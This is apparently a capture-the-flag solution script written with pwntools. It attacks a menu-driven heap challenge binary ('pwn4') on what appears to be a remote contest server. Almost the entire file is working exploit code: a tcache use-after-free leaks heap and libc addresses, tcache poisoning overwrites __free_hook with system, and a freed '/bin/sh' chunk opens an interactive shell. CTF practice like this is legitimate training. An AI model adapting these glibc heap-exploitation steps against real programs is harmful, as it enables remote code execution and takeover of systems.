#coding:utf8
from pwn import *

context.log_level = 'debug'
sh = process('./pwn4')
# sh = process('./pwn4',env = {'LD_PRELOAD':'./libc-2.31.so'})
sh = remote('113.201.14.253',16222)
# sh = remote('127.0.0.1',9999)
context.terminal = ["/bin/tmux", "sp",'-h']
dbg = lambda text=None  : gdb.attach(sh, text)
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6')
libc = ELF('./libc-2.31.so')
def add(index,name,key,value):
   sh.sendlineafter('Your choice:','1')
   sh.sendlineafter('index:',str(index))
   sh.sendlineafter('name:',name)
   sh.sendlineafter('key:',key)
   sh.sendlineafter('value:',str(value))
def show(index):
   sh.sendlineafter('Your choice:','2')
   sh.sendlineafter('index:',str(index))
def edit(index,name,length,key,value):
   sh.sendlineafter('Your choice:','3')
   sh.sendlineafter('index:',str(index))
   sh.sendlineafter('name:',name)
   sh.sendlineafter('length:',str(length))
   sh.sendlineafter('Key:',key)
   sh.sendlineafter('Value:',str(value))
def delete(index):
   sh.sendlineafter('Your choice:','4')
   sh.sendlineafter('index:',str(index))
add(0,'a'*0x10,'b'*0x20,0x12345678)
add(1,'c'*0x10,'d'*0x20,0x12345678)
delete(0)
# tcache leak heapaddr
show(0)
sh.recvuntil('Key: ')
heap_addr = u64(sh.recv(6).ljust(8,'\x00'))
print 'heap_addr=',hex(heap_addr)
delete(1)
# modify freed chunk0 keyvalue point keyaddr,make a loop
edit(0,'a'*0x10,6,p64(heap_addr + 0x80)[0:6],0x66666666)
# malloc 2 chunk
add(2,'c'*0x10,'d'*0x20,0x12345678)
add(3,'c'*0x10,'d'*0x20,0x12345678)
# bypass tcache
for i in range(4,13):
   add(i,'c'*0x10,str(i-4)*0x100,0x12345678)
for i in range(4,4+7):
   delete(i)
# unsortedbin leak libc
show(10)
sh.recvuntil('Key: ')
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - 0x1ebbe0
system_addr = libc_base + libc.sym['system']
free_hook_addr = libc_base + libc.sym['__free_hook']
print 'libc_base=',hex(libc_base)
# free 2 to tcache
delete(2)

# modify keyvalue to freehook
edit(2,'a'*0x10,6,p64(free_hook_addr)[0:6],0x66666666)

add(2,'c'*0x10,'/bin/sh\x00',0x12345678)
# dbg()
# modify freehook to system
add(4,'c'*0x10,p64(system_addr)+p64(0)*3,0x12345678)
# dbg()
# pause()
#getshell
delete(2)
sh.interactive()